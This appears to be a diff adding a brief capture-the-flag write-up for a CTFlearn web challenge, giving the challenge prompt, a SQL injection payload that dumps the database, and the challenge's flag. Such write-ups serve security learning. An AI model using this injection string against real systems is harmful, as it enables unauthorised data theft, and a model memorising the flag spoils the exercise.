@@ -1,0 +1,5 @@
+See if you can leak the whole database. The flag is in there somwhere… https://web.ctflearn.com/web4/
+
+if injecting 1'or'1'='1' # data is leaked and also the flag
+
+flag = th4t_is_why_you_n33d_to_sanitiz3_inputs 
